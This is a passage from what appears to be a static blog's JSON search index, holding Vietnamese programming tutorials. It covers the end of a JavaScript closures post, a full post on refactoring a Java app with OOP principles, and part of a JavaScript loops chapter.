cong = (a, b) =\u0026gt; a + b; ❌ Cẩn thận với rò rỉ bộ nhớ\n// Đừng đóng gói các đối tượng lớn không cần thiết 📊 Hành trình hiểu Closure #Giai đoạn 1: \u0026ldquo;Closure là gì?\u0026rdquo; (Tuần 1) #Bối rối. Ví dụ không hiểu. Tại sao hàm nhớ được?\nGiai đoạn 2: \u0026ldquo;À, cú pháp như thế\u0026rdquo; (Tuần 2-3) #Có thể viết closure đơn giản. Copy-paste mẫu thì được.\nGiai đoạn 3: \u0026ldquo;Khoan, tại sao vậy?\u0026rdquo; (Tuần 4-6) #Hiểu chuỗi phạm vi. Ngữ cảnh thực thi. Môi trường từ vựng. Lý thuyết bắt đầu rõ.\nGiai đoạn 4: \u0026ldquo;Mạnh quá!\u0026rdquo; (Tuần 7-8) #Nhận ra mẫu closure ở khắp nơi. React hooks, xử lý sự kiện, modules.\nGiai đoạn 5: \u0026ldquo;Không thể thiếu\u0026rdquo; (Tuần 9+) #Dùng closure một cách tự nhiên. Tạo mẫu riêng. Đánh giá cao sự tinh tế.\nTổng thời gian: Khoảng 2-3 tháng để thực sự thành thạo.\n📚 Tài nguyên học tập #Học:\nMDN: Closures JavaScript.info: Closures You Don\u0026rsquo;t Know JS: Phạm vi \u0026amp; Closures Thực hành:\nXây dựng biến riêng tư Tạo nhà máy hàm Làm hàm ghi nhớ Refactor code với closure 💭 Kết luận #9 tháng trước: \u0026ldquo;Closure? Chưa nghe bao giờ.\u0026rdquo;\n6 tháng trước: \u0026ldquo;Closure có tồn tại nhưng\u0026hellip; khó hiểu quá.\u0026rdquo;\n3 tháng trước: \u0026ldquo;À! Giờ hiểu rồi!\u0026rdquo;\nHôm nay: \u0026ldquo;Closure ở khắp nơi. Không thể không thấy nó.\u0026rdquo;\nBài học:\nClosure không phải là \u0026ldquo;tính năng nâng cao\u0026rdquo;. Đây là nền tảng của JavaScript. Nó xảy ra mỗi khi hàm truy cập biến ở phạm vi bên ngoài. Bạn đã dùng nó mà không biết!\nReact Hooks? Closure.\nXử lý sự kiện? Closure.\nModules? Closure.\nBiến riêng tư? Closure.\nInsight quan trọng:\n\u0026ldquo;Các hàm JavaScript mang theo phạm vi của chúng. Hàm không chỉ nhớ những gì chúng làm - chúng còn nhớ NƠI chúng sinh ra.\u0026rdquo;\nHiểu closure = Hiểu JavaScript sâu sắc.\nTừ \u0026lsquo;Hả?\u0026rsquo; đến \u0026lsquo;À ra thế!\u0026rsquo; - Hành trình xứng đáng với mọi bối rối. 🚀\nBạn đã hiểu closure chưa? Chia sẻ khoảnh khắc \u0026ldquo;à ra thế!\u0026rdquo; nhé!\n#JavaScript #Closures #PhạmViBiến #MôiTrườngTừVựng #NângCao\n","date":"14 October 2025","permalink":"http://localhost:1313/posts/javascript-closures-scope/","section":"Posts","summary":"Tôi code JavaScript 6 tháng mới biết closures tồn tại. Thêm 3 tháng nữa mới thực sự hiểu nó. Đây là con đường ngắn hơn để bạn hiểu.","title":"JavaScript Closures: Từ 'Hả?' đến 'À ra thế!' - Bí mật về phạm vi biến"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/n%C3%A2ng-cao/","section":"Tags","summary":"","title":"Nâng Cao"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/object-oriented-programming/","section":"Tags","summary":"","title":"Object-Oriented Programming"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/oop/","section":"Tags","summary":"","title":"OOP"},{"content":"Tôi còn nhớ rất rõ ngày đầu tiên học về OOP. Giáo viên vẽ lên bảng 4 từ: Encapsulation, Inheritance, Polymorphism, Abstraction. Tôi note lại, học thuộc định nghĩa, làm bài tập, và nghĩ rằng mình đã \u0026ldquo;hiểu\u0026rdquo; OOP.\nCho đến khi tôi phải refactor một project có 1500 dòng code trong một file duy nhất. Code hoạt động, nhưng mỗi lần thêm feature mới, tôi phải sửa 10 chỗ khác nhau. Mỗi lần fix bug, 3 bug mới xuất hiện.\nĐó là lúc tôi nhận ra: Hiểu lý thuyết OOP ≠ Biết áp dụng OOP.\nBài viết này không phải để giải thích lại 4 trụ cột OOP (Google có đầy). Đây là câu chuyện về cách tôi thực sự học được OOP - qua việc phá vỡ và xây dựng lại code của chính mình.\n🔥 Vấn đề: Khi code của bạn trở thành \u0026ldquo;spaghetti\u0026rdquo; #Dự án gốc: Student Management System (Version 1.0) #Tháng đầu học Java, tôi tự hào với project này. Nó hoạt động! Có GUI! Lưu được database! Nhưng\u0026hellip;\n// StudentManagementApp.java - 1500 dòng code trong 1 file public class StudentManagementApp { // 50+ biến global static Scanner scanner = new Scanner(System.in); static Connection connection; static String[] studentNames = new String[100]; static double[] studentGPAs = new double[100]; static String[] studentEmails = new String[100]; static int studentCount = 0; public static void main(String[] args) { // 200 dòng logic trong main() while (true) { System.out.println(\u0026#34;1. Add Student\u0026#34;); System.out.println(\u0026#34;2. View Students\u0026#34;); System.out.println(\u0026#34;3. Update Student\u0026#34;); // ... 20 options khác int choice = scanner.nextInt(); if (choice == 1) { // 50 dòng code inline System.out.print(\u0026#34;Enter name: \u0026#34;); String name = scanner.next(); // validation logic... // database logic... // business logic... // tất cả lộn xộn ở đây } else if (choice == 2) { // Another 50 dòng code } // ... và cứ thế tiếp tục } } } Vấn đề khi thêm feature mới:\nKhách hàng (bạn tôi) yêu cầu: \u0026ldquo;Thêm Teacher management vào app\u0026rdquo;\nTôi mất 3 ngày vì:\n❌ Phải copy-paste code Student và sửa lại ❌ Mỗi lần sửa phải scroll qua 1500 dòng code ❌ Không dám refactor vì sợ break mọi thứ ❌ Bug xuất hiện ở những chỗ không ngờ tới Đó là lúc mentor của tôi nhìn code và nói: \u0026ldquo;This is not how you Java.\u0026rdquo;\n🎯 Giải pháp: OOP đến cứu nguy #Mentor của tôi ngồi xuống và hỏi:\n\u0026ldquo;Nếu đây là thế giới thực, Student và Teacher có gì giống nhau?\u0026rdquo;\nTôi nghĩ một chút: \u0026ldquo;Cả hai đều là\u0026hellip; người? Đều có tên, tuổi, email\u0026hellip;\u0026rdquo;\n\u0026ldquo;Chính xác. Vậy tại sao code lại viết riêng biệt?\u0026rdquo;\nMột câu hỏi đơn giản, nhưng nó thay đổi cách tôi code mãi mãi.\n📐 Principle 1: Encapsulation - Đóng gói dữ liệu #Vấn đề với code cũ: #// Trước khi refactor static String[] studentNames = new String[100]; static double[] studentGPAs = new double[100]; // Ở bất kỳ đâu trong code studentGPAs[5] = -1.5; // Không ai kiểm tra! GPA âm!? studentNames[10] = null; // NPE waiting to happen Dữ liệu scattered everywhere. Không có validation. Chaos.\nSau khi áp dụng Encapsulation: #public class Student { // Private - Không ai có thể access trực tiếp private String id; private String name; private String email; private double gpa; // Constructor với validation public Student(String id, String name, String email, double gpa) { this.id = id; setName(name); // Dùng setter để validate setEmail(email); setGpa(gpa); } // Getters public String getName() { return name; } public double getGpa() { return gpa; } // Setters với validation public void setName(String name) { if (name == null || name.trim().isEmpty()) { throw new IllegalArgumentException(\u0026#34;Name cannot be empty\u0026#34;); } this.name = name.trim(); } public void setGpa(double gpa) { if (gpa \u0026lt; 0.0 || gpa \u0026gt; 4.0) { throw new IllegalArgumentException(\u0026#34;GPA must be between 0.0 and 4.0\u0026#34;); } this.gpa = gpa; } public void setEmail(String email) { // Email validation String emailRegex = \u0026#34;^[A-Za-z0-9+_.-]+@[A-Za-z0-9.-]+$\u0026#34;; if (!email.matches(emailRegex)) { throw new IllegalArgumentException(\u0026#34;Invalid email format\u0026#34;); } this.email = email; } // Business logic public String getGrade() { if (gpa \u0026gt;= 3.6) return \u0026#34;Excellent\u0026#34;; if (gpa \u0026gt;= 3.2) return \u0026#34;Good\u0026#34;; if (gpa \u0026gt;= 2.5) return \u0026#34;Average\u0026#34;; return \u0026#34;Poor\u0026#34;; } public boolean isEligibleForScholarship() { return gpa \u0026gt;= 3.5; } } Lợi ích ngay lập tức:\n✅ Validation tập trung: Một chỗ duy nhất để check data\n✅ Bug giảm 80%: Không còn invalid data\n✅ Dễ maintain: Muốn đổi logic? Chỉ sửa 1 file\n✅ Testable: Có thể viết unit test dễ dàng\nReal-world impact:\nTrước đây: Thêm validation cho email mất 2 giờ (sửa 15 chỗ)\nBây giờ: Chỉ mất 5 phút (sửa 1 method)\n🌳 Principle 2: Inheritance - Tái sử dụng code thông minh #Vấn đề: Code lặp lại #Khi thêm Teacher, tôi copy-paste toàn bộ Student code. Kết quả:\n// Student.java - 300 dòng class Student { private String id; private String name; private String email; private LocalDate dateOfBirth; // ... 20 properties khác // 50 methods } // Teacher.java - 290 dòng (gần giống hệt) class Teacher { private String id; private String name; private String email; private LocalDate dateOfBirth; // ... 20 properties GIỐNG Student // 45 methods GIỐNG Student // + 5 methods riêng } Có gì sai? Mọi thứ!\nSửa bug ở Student, phải sửa lại ở Teacher Thêm feature ở Student, phải code lại ở Teacher 600 dòng code có thể giảm còn 400 Giải pháp: Inheritance #// Base class - Chứa những gì chung public abstract class Person { // Common properties protected String id; protected String name; protected String email; protected String phone; protected LocalDate dateOfBirth; // Constructor public Person(String id, String name, String email) { this.id = id; setName(name); setEmail(email); } // Common methods public String getName() { return name; } public void setName(String name) { if (name == null || name.trim().isEmpty()) { throw new IllegalArgumentException(\u0026#34;Name cannot be empty\u0026#34;); } this.name = name; } public int getAge() { if (dateOfBirth == null) return 0; return Period.between(dateOfBirth, LocalDate.now()).getYears(); } // Abstract method - Child phải implement public abstract String getRole(); public abstract void displayInfo(); } // Student - Chỉ code phần khác biệt public class Student extends Person { // Student-specific properties private double gpa; private String major; private int enrollmentYear; public Student(String id, String name, String email, double gpa) { super(id, name, email); // Gọi constructor của Person setGpa(gpa); } @Override public String getRole() { return \u0026#34;Student\u0026#34;; } @Override public void displayInfo() { System.out.println(\u0026#34;=== STUDENT INFO ===\u0026#34;); System.out.println(\u0026#34;ID: \u0026#34; + id); System.out.println(\u0026#34;Name: \u0026#34; + name); System.out.println(\u0026#34;Email: \u0026#34; + email); System.out.println(\u0026#34;GPA: \u0026#34; + gpa); System.out.println(\u0026#34;Major: \u0026#34; + major); } // Student-specific methods public String getGrade() { if (gpa \u0026gt;= 3.6) return \u0026#34;Excellent\u0026#34;; if (gpa \u0026gt;= 3.0) return \u0026#34;Good\u0026#34;; return \u0026#34;Average\u0026#34;; } public boolean isEligibleForScholarship() { return gpa \u0026gt;= 3.5; } // Getters/Setters public void setGpa(double gpa) { if (gpa \u0026lt; 0 || gpa \u0026gt; 4.0) { throw new IllegalArgumentException(\u0026#34;Invalid GPA\u0026#34;); } this.gpa = gpa; } public double getGpa() { return gpa; } } // Teacher - Chỉ code phần riêng public class Teacher extends Person { // Teacher-specific properties private String department; private double salary; private List\u0026lt;String\u0026gt; courses; public Teacher(String id, String name, String email, String department) { super(id, name, email); this.department = department; this.courses = new ArrayList\u0026lt;\u0026gt;(); } @Override public String getRole() { return \u0026#34;Teacher\u0026#34;; } @Override public void displayInfo() { System.out.println(\u0026#34;=== TEACHER INFO ===\u0026#34;); System.out.println(\u0026#34;ID: \u0026#34; + id); System.out.println(\u0026#34;Name: \u0026#34; + name); System.out.println(\u0026#34;Email: \u0026#34; + email); System.out.println(\u0026#34;Department: \u0026#34; + department); System.out.println(\u0026#34;Courses: \u0026#34; + String.join(\u0026#34;, \u0026#34;, courses)); } // Teacher-specific methods public void assignCourse(String course) { if (!courses.contains(course)) { courses.add(course); System.out.println(\u0026#34;Assigned course: \u0026#34; + course); } } public void removeCourse(String course) { courses.remove(course); System.out.println(\u0026#34;Removed course: \u0026#34; + course); } public int getTeachingLoad() { return courses.size(); } } Kết quả:\n✅ Code giảm từ 600 dòng → 400 dòng (33% reduction)\n✅ Sửa bug ở Person → Tất cả child classes đều được fix\n✅ Thêm Admin, Staff chỉ mất 10 phút\n✅ Code dễ đọc, dễ maintain hơn nhiều\n🎭 Principle 3: Polymorphism - Một interface, nhiều implementations #Tình huống thực tế: #Tôi cần display thông tin cho Student, Teacher, và Admin. Cách cũ:\n// Before Polymorphism - Ugly! if (person instanceof Student) { Student s = (Student) person; System.out.println(\u0026#34;Student: \u0026#34; + s.getName()); System.out.println(\u0026#34;GPA: \u0026#34; + s.getGpa()); } else if (person instanceof Teacher) { Teacher t = (Teacher) person; System.out.println(\u0026#34;Teacher: \u0026#34; + t.getName()); System.out.println(\u0026#34;Department: \u0026#34; + t.getDepartment()); } else if (person instanceof Admin) { Admin a = (Admin) person; System.out.println(\u0026#34;Admin: \u0026#34; + a.getName()); System.out.println(\u0026#34;Role: \u0026#34; + a.getRole()); } Thêm một loại person mới? Phải sửa hàng tá chỗ!\nVới Polymorphism: #// One method to rule them all public void displayPerson(Person person) { person.displayInfo(); // Gọi method của child class tương ứng } // Usage - Clean \u0026amp; Simple List\u0026lt;Person\u0026gt; people = new ArrayList\u0026lt;\u0026gt;(); people.add(new Student(\u0026#34;S001\u0026#34;, \u0026#34;An\u0026#34;, \u0026#34;an@email.com\u0026#34;, 3.8)); people.add(new Teacher(\u0026#34;T001\u0026#34;, \u0026#34;Bình\u0026#34;, \u0026#34;binh@email.com\u0026#34;, \u0026#34;CS\u0026#34;)); people.add(new Admin(\u0026#34;A001\u0026#34;, \u0026#34;Cường\u0026#34;, \u0026#34;cuong@email.com\u0026#34;, \u0026#34;IT Manager\u0026#34;)); for (Person person : people) { displayPerson(person); // Polymorphism at work! System.out.println(\u0026#34;---\u0026#34;); } Output:\n=== STUDENT INFO ===\rID: S001\rName: An\rGPA: 3.8\r---\r=== TEACHER INFO ===\rID: T001\rName: Bình\rDepartment: CS\r---\r=== ADMIN INFO ===\rID: A001\rName: Cường\rRole: IT Manager\r--- Magic? Không! Đó là Polymorphism.\nJava tự động gọi đúng method của từng class. Thêm 10 loại person mới? Code trên vẫn hoạt động mà không cần sửa!\nReal-world example: Payment System #// Payment Interface interface PaymentMethod { boolean processPayment(double amount); String getPaymentType(); } // Multiple Implementations class CreditCardPayment implements PaymentMethod { private String cardNumber; @Override public boolean processPayment(double amount) { System.out.println(\u0026#34;Processing credit card payment: $\u0026#34; + amount); // Credit card logic return true; } @Override public String getPaymentType() { return \u0026#34;Credit Card\u0026#34;; } } class PayPalPayment implements PaymentMethod { private String email; @Override public boolean processPayment(double amount) { System.out.println(\u0026#34;Processing PayPal payment: $\u0026#34; + amount); // PayPal API logic return true; } @Override public String getPaymentType() { return \u0026#34;PayPal\u0026#34;; } } class BankTransferPayment implements PaymentMethod { private String accountNumber; @Override public boolean processPayment(double amount) { System.out.println(\u0026#34;Processing bank transfer: $\u0026#34; + amount); // Bank API logic return true; } @Override public String getPaymentType() { return \u0026#34;Bank Transfer\u0026#34;; } } // Order class - Không cần biết payment method cụ thể class Order { private PaymentMethod paymentMethod; public void checkout(double amount) { System.out.println(\u0026#34;Processing order...\u0026#34;); boolean success = paymentMethod.processPayment(amount); if (success) { System.out.println(\u0026#34;✓ Order completed via \u0026#34; + paymentMethod.getPaymentType()); } } public void setPaymentMethod(PaymentMethod method) { this.paymentMethod = method; } } // Usage - Super flexible Order order = new Order(); // Khách hàng 1: Credit Card order.setPaymentMethod(new CreditCardPayment(\u0026#34;1234-5678\u0026#34;)); order.checkout(100.0); // Khách hàng 2: PayPal order.setPaymentMethod(new PayPalPayment(\u0026#34;user@email.com\u0026#34;)); order.checkout(200.0); // Thêm Bitcoin payment? Chỉ cần tạo class mới implement PaymentMethod! Lợi ích:\nThêm payment method mới không cần sửa Order class Dễ test (mock PaymentMethod) Flexible và scalable 🎨 Principle 4: Abstraction - Che giấu complexity #Vấn đề: Quá nhiều details #User không cần biết bạn lưu data vào MySQL hay MongoDB. Họ chỉ cần \u0026ldquo;save\u0026rdquo; và \u0026ldquo;load\u0026rdquo;.\n// BAD - Expose implementation details public class StudentDatabase { public void saveToMySQL(Student s) { // MySQL specific code } public void saveToMongoDB(Student s) { // MongoDB specific code } } // User phải biết database nào đang dùng database.saveToMySQL(student); // Tightly coupled! GOOD - Abstraction #// Interface - Abstract away implementation public interface StudentRepository { void save(Student student); Student findById(String id); List\u0026lt;Student\u0026gt; findAll(); void update(Student student); void delete(String id); } // MySQL Implementation public class MySQLStudentRepository implements StudentRepository { private Connection connection; @Override public void save(Student student) { String sql = \u0026#34;INSERT INTO students (id, name, gpa) VALUES (?, ?, ?)\u0026#34;; try (PreparedStatement stmt = connection.prepareStatement(sql)) { stmt.setString(1, student.getId()); stmt.setString(2, student.getName()); stmt.setDouble(3, student.getGpa()); stmt.executeUpdate(); } catch (SQLException e) { throw new RuntimeException(\u0026#34;Error saving student\u0026#34;, e); } } @Override public Student findById(String id) { // MySQL query return null; } // Implement other methods... } // MongoDB Implementation public class MongoDBStudentRepository implements StudentRepository { private MongoCollection\u0026lt;Document\u0026gt; collection; @Override public void save(Student student) { Document doc = new Document() .append(\u0026#34;id\u0026#34;, student.getId()) .append(\u0026#34;name\u0026#34;, student.getName()) .append(\u0026#34;gpa\u0026#34;, student.getGpa()); collection.insertOne(doc); } @Override public Student findById(String id) { // MongoDB query return null; } // Implement other methods... } // Service Layer - Không biết database nào public class StudentService { private StudentRepository repository; // Dependency Injection public StudentService(StudentRepository repository) { this.repository = repository; } public void enrollStudent(Student student) { // Business logic if (student.getGpa() \u0026lt; 2.0) { throw new IllegalArgumentException(\u0026#34;GPA too low\u0026#34;); } // Save - Không quan tâm MySQL hay MongoDB repository.save(student); } } // Usage - Flexible! // Development: Dùng MySQL StudentService service1 = new StudentService(new MySQLStudentRepository()); // Production: Chuyển sang MongoDB chỉ cần đổi 1 dòng StudentService service2 = new StudentService(new MongoDBStudentRepository()); // Testing: Dùng Mock StudentService service3 = new StudentService(new MockStudentRepository()); Benefits:\n✅ Flexibility: Đổi database không cần sửa business logic\n✅ Testability: Dễ dàng mock cho testing\n✅ Maintainability: Thay đổi implementation không ảnh hưởng client code\n✅ Team work: Người khác có thể implement interface theo cách riêng\n🏗️ Putting It All Together: Final Architecture #Sau khi refactor hoàn toàn, đây là kiến trúc cuối cùng:\nsrc/\r├── models/\r│ ├── Person.java (abstract base class)\r│ ├── Student.java\r│ ├── Teacher.java\r│ └── Admin.java\r│\r├── repositories/\r│ ├── Repository.java (interface)\r│ ├── StudentRepository.java (interface)\r│ ├── MySQLStudentRepository.java\r│ └── MongoDBStudentRepository.java\r│\r├── services/\r│ ├── StudentService.java\r│ ├── TeacherService.java\r│ └── AuthService.java\r│\r├── controllers/\r│ ├── StudentController.java\r│ └── TeacherController.java\r│\r└── utils/\r├── Validator.java\r└── DatabaseConnection.java Before vs After:\nMetric Before After Improvement Files 1 15 Better organization Lines/File 1500 100-200 More readable Code Duplication ~40% \u0026lt;5% DRY principle Bug Fix Time Hours Minutes Maintainability Add Feature Time Days Hours Extensibility Test Coverage 0% 80% Quality 💡 Lessons Learned #1. OOP là mindset, không phải syntax #Bạn có thể viết Java mà không OOP. Nhưng bạn sẽ khổ.\n2. Đừng over-engineer từ đầu #Version 1.0 của tôi cũng không hoàn hảo. Refactor là phần của process.\n3. SOLID principles là bạn # Single Responsibility Open/Closed Liskov Substitution Interface Segregation Dependency Inversion Học sau khi đã hiểu OOP.\n4. Practice, practice, practice #Đọc 100 bài về OOP không bằng refactor 1 dự án thực tế.\n5. Code review #Nhờ người khác review code. Tôi học được nhiều nhất từ feedback.\n🎯 Thử thách cho bạn #Hãy lấy một dự án cũ của bạn và tự hỏi:\nCó methods dài hơn 50 dòng không? Có code lặp lại không? Có global variables không cần thiết không? Nếu thêm feature mới, phải sửa bao nhiêu chỗ? Nếu câu trả lời là \u0026ldquo;Có\u0026rdquo;, đó là dấu hiệu cần refactor với OOP.\n📚 Resources #Sách:\n\u0026ldquo;Head First Object-Oriented Analysis and Design\u0026rdquo; \u0026ldquo;Clean Code\u0026rdquo; by Robert C. Martin \u0026ldquo;Refactoring\u0026rdquo; by Martin Fowler Courses:\nObject-Oriented Programming in Java - Coursera Design Patterns in Java - Udemy Practice:\nRefactor một dự án cũ Code review với bạn bè Contribute to open source 💭 Kết luận #OOP không làm code của bạn chạy nhanh hơn. Nó không làm app của bạn có nhiều feature hơn. Nhưng nó làm:\n✅ Code dễ đọc hơn\n✅ Dễ maintain hơn\n✅ Dễ scale hơn\n✅ Dễ collaborate hơn\nVà quan trọng nhất: Nó làm bạn trở thành better developer.\n6 tháng trước, tôi viết code hoạt động. Hôm nay, tôi viết code mà người khác có thể đọc và maintain. Đó là sự khác biệt giữa coder và software engineer.\nThe journey from spaghetti to clean code continues\u0026hellip; 🚀\nBạn đã refactor code nào với OOP chưa? Chia sẻ kinh nghiệm nhé!\n#Java #OOP #CleanCode #SoftwareEngineering #Programming\n","date":"14 October 2025","permalink":"http://localhost:1313/posts/oop-trong-java/","section":"Posts","summary":"OOP không phải để thi. Đây là cách tôi dùng 4 trụ cột OOP để refactor một đống spaghetti code thành kiến trúc sạch đẹp.","title":"OOP trong Java: Khi lý thuyết gặp thực tế - Những bài học từ dự án thực chiến"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/scope/","section":"Tags","summary":"","title":"Scope"},{"content":"\rMục tiêu: chương này trình bày chi tiết mọi loại vòng lặp trong JavaScript, ví dụ thực tế, anti-patterns, so sánh, hiệu suất, các lỗi thường gặp và bài tập có lời giải.\n1. Giới thiệu chung #Vòng lặp (loop) là cấu trúc cho phép thực thi một khối mã nhiều lần. Vòng lặp khác nhau ở:\nkhi nào kiểm tra điều kiện (đầu/ cuối) đối tượng để lặp (số lần, mảng, object, iterable) khả năng thoát sớm (break), bỏ qua (continue) tương tác với async/await Trong JavaScript phổ biến: while, do...while, for, for...of, for...in, và các phương thức mảng (forEach, map, filter, reduce, \u0026hellip;).\n2. while #\r2.1 Cú pháp #while (condition) { // body } 2.2 Nguyên lý # Kiểm tra condition điều kiện trước mỗi lần lặp. Nếu true → chạy body → quay lại kiểm tra. Nếu false → không chạy body lần nào (nếu ban đầu false). 2.3 Ví dụ cơ bản #let i = 0; while (i \u0026lt; 5) { console.log(i); i++; } 2.4 Ví dụ thực tế: poll một trạng thái #Giả sử ta muốn chờ giá trị ready trở thành true (ví dụ demo; thực tế dùng event thay vì poll):\nasync function waitForReady(checkFn, interval = 500, timeout = 5000) { const start = Date.now(); while (Date.now() - start \u0026lt; timeout) { const ok = await checkFn(); if (ok) return true; await new Promise((r) =\u0026gt; setTimeout(r, interval)); } return false; } 5.5 Pitfall — vòng vô hạn #\rlet i = 0; while (i \u0026lt; 3) { console.log(i); // missing i++ =\u0026gt; infinite loop } Cách debug: thêm console.log, breakpoint; đảm bảo biến thay đổi. Tránh while(true) không có break trừ khi cần thiết (server loops).\nPattern: sentinel loop #Khi đầu vào kết thúc bởi \u0026ldquo;sentinel\u0026rdquo; (ví dụ: nhập -1 để dừng):\nlet n; while ((n = Number(prompt(\u0026#34;Nhập số (-1 để kết thúc)\u0026#34;))) !== -1) { console.log(\u0026#34;Bạn nhập\u0026#34;, n); } 3. do\u0026hellip;while #3.1 Cú pháp #do { // body } while (condition); 3.2 Điểm nổi bật # Body chạy ít nhất 1 lần, sau đó mới kiểm tra condition. Dùng cho menu hoặc nhập dữ liệu cần chạy trước, kiểm tra sau. 3.3 Ví dụ #let answer; do { answer = prompt(\u0026#34;Tiếp tục? (yes/no)\u0026#34;); } while (answer !== \u0026#34;no\u0026#34;); 4. for (cổ điển) #4.1 Cú pháp tiêu chuẩn #for (initialization; condition; finalExpression) { // body } initialization chạy một lần. condition kiểm tra trước mỗi lần lặp. finalExpression chạy sau mỗi body (thường tăng biến đếm). 4.2 Ví dụ #for (let i = 0; i \u0026lt; 5; i++) console.log(i); 4.3 Và nhiều biến cùng lúc #for (let i = 0, len = arr.length; i \u0026lt; len; i++) { ... } 4.4 Hoisting / scope: var vs let #for (var i = 0; i \u0026lt; 3; i++) {} console.log(i); // 3 (var là function-scoped) for (let j = 0; j \u0026lt; 3; j++) {} console.log(typeof j); // undefined (j không tồn tại ngoài block) Lời khuyên: luôn dùng let/const(for \u0026hellip; of) trong vòng lặp.\n4.5 Closure trong loop (bẫy phổ biến) #for (var i = 0; i \u0026lt; 3; i++) { setTimeout(() =\u0026gt; console.log(i), 100); } // Kết quả: 3,3,3 (vì var i dùng chung sau vòng lập i = 3) // Fix 1: dùng let for (let i = 0; i \u0026lt; 3; i++) { setTimeout(() =\u0026gt; console.log(i), 100); // 0,1,2 } // Fix 2: IIFE for (var i = 0; i \u0026lt; 3; i++) { // Mỗi vòng lặp sẽ tạo ra một hàm mới. // Tham số (i) truyền vào là bản sao của giá trị i ở vòng đó. (function (i) { setTimeout(() =\u0026gt; console.log(i), 100); })(i); // =\u0026gt; Mỗi hàm IIFE có biến i riêng biệt trong scope riêng của nó. } 4.6 Ví dụ: vòng lặp lồng nhau (matrix) #const mat = [ [1, 2, 3], [4, 5, 6], [7, 8, 9], ]; for (let i = 0; i \u0026lt; mat.length; i++) { for (let j = 0; j \u0026lt; mat[i].length; j++) { console.log(i, j, mat[i][j]); } } 5. for\u0026hellip;of #5.1 Cú pháp #for (const val of iterable) { // val is each value } 5.2 Iterable? (các đối tượng support) # Array, String, Map, Set, NodeList, arguments, các object có Symbol.iterator 5.3 Ví dụ #for (const ch of \u0026#34;abc\u0026#34;) console.log(ch); // a b c const s = new Set([1, 2, 3]); for (const v of s) console.log(v); 5.4 for\u0026hellip;of vs forEach vs for (classic) # for...of hỗ trợ break, continue và await (tuần tự) — rất phù hợp để gọi async tuần tự. for (const item of [1, 2, 3]) { if (item === 2) continue; console.log(item); // 1, 3 } forEach không dừng bằng break (không hỗ trợ await tuần tự). [1, 2, 3].forEach((item) =\u0026gt; console.log(item)); for cổ điển phù hợp khi cần index hoặc nâng cấp hiệu năng vi mô. for (let i = 0; i \u0026lt; 3; i++) { console.log(i); } 5.5 Destructuring với for\u0026hellip;of (Map entries) #const m = new Map([ [\u0026#34;a\u0026#34;, 1], [\u0026#34;b\u0026#34;, 2], ]); for (const [k, v] of m) { console.log(k, v); } 6. for\u0026hellip;in #6.1 Cú pháp #for (const key in object) { // key is property name (string) } 6.2 Dùng để lặp thuộc tính của object (không dùng cho mảng) #const user = { name: \u0026#34;Alice\u0026#34;, age: 30 }; for (const k in user) { if (user.hasOwnProperty(k)) { console.log(k, user[k]); } } 6.3 Cảnh báo # for...in lặp cả thuộc tính trên prototype chain. Dùng kèm hasOwnProperty nếu cần. Thứ tự không được đảm bảo (với object). Với mảng, dùng for hoặc for...of. 7. Các phương thức lặp của mảng (functional) #Các phương thức này không phải là \u0026lsquo;vòng lặp\u0026rsquo; cú pháp, nhưng thực hiện lặp nội bộ.\n7.1 arr.forEach(fn) # Chạy fn(value, index, array) cho từng phần tử. Trả về undefined (không chain được result). Không hỗ trợ break / continue. Có thể return ra khỏi callback nhưng không thoát vòng lặp ngoài. [1, 2, 3].forEach((v, i) =\u0026gt; console.log(i, v)); 7.2 arr.map(fn) # Trả về mảng mới: result[i] = fn(array[i]). Dùng khi cần chuyển đổi mảng. const doubled = [1, 2, 3].map((x) =\u0026gt; x * 2); // [2,4,6] 7.3 arr.filter(fn) # Trả về mảng gồm phần tử thỏa điều kiện fn (true). const evens = [1, 2, 3, 4].filter((x) =\u0026gt; x % 2 === 0); // [2,4] 7.4 arr.reduce(fn, init) # Dùng để gộp mảng thành 1 giá trị (accumulator). const sum = [1, 2, 3].reduce((acc, v) =\u0026gt; acc + v, 0); 7.5 arr.find / findIndex / some / every # find trả về phần tử đầu tiên thỏa điều kiện. findIndex trả về index của phần tử đầu tiên thỏa điều kiện. some trả về true nếu bất kỳ phần tử thỏa điều kiện. every trả về true nếu tất cả phần tử thỏa điều kiện. 7.6 flatMap (ES2019) # Map từng phần tử và \u0026ldquo;phẳng hóa\u0026rdquo; kết quả 1 mức. 7.7 Lưu ý async \u0026amp; forEach/map # arr.forEach(async x =\u0026gt; { await ... }) sẽ không tuần tự (outer function won\u0026rsquo;t await the inner promises). Dùng for...of + await nếu cần tuần tự. 8. break / continue / label #8.1 break # Thoát hoàn toàn vòng lặp hiện tại. for (let i = 0; i \u0026lt; 10; i++) { if (i === 4) break; console.log(i); } 8.2 continue # Bỏ phần còn lại trong lần lặp, chuyển sang lần tiếp theo. for (let i = 0; i \u0026lt; 5; i++) { if (i % 2 === 0) continue; console.log(i); } 8.3 Labeled break / continue (khi dùng nested loops) #outer: for (let i = 0; i \u0026lt; 3; i++) { for (let j = 0; j \u0026lt; 3; j++) { if (i === 1 \u0026amp;\u0026amp; j === 1) break outer; console.log(i, j); } } // Kết quả: // 0 0 // 0 1 // 0 2 // 1 0 Cẩn trọng: labelled break/continue làm code khó đọc; chỉ dùng khi thực sự cần.\n9. Vòng lặp lồng nhau \u0026amp; tối ưu hóa #9.1 Tính phức tạp thời gian # Nested loops thường O(n*m) hoặc O(n^2) nếu hai chiều tương tự. Ví dụ: loop lồng nhau kiểm tra cặp phần tử → O(n^2). 9.2 Ví dụ — tìm cặp có tổng k (O(n^2)) #const arr = [1, 2, 3, 4, 5]; const k = 7; for (let i = 0; i \u0026lt; arr.length; i++) { for (let j = i + 1; j \u0026lt; arr.length; j++) { if (arr[i] + arr[j] === k) { console.log(\u0026#34;Found\u0026#34;, arr[i], arr[j]); } } } 9.3 Tối ưu: dùng bộ nhớ (hash) để giảm xuống O(n) #const seen = new Set(); for (const v of arr) { const need = k - v; if (seen.has(need)) { console.log(\u0026#34;Found\u0026#34;, v, need); break; } seen.add(v); } 9.4 Lồng nhiều cấp (3+): cân nhắc thuật toán khác (divide and conquer, sort \u0026amp; two-pointer, k-sum optimized) # 10. Xóa / Chỉnh sửa phần tử khi lặp #Các cách phổ biến và an toàn:\n10.1 Lặp từ cuối về đầu (splice an toàn) #for (let i = arr.length - 1; i \u0026gt;= 0; i--) { if (arr[i] \u0026lt; threshold) arr.splice(i, 1); } 10.2 Dùng filter 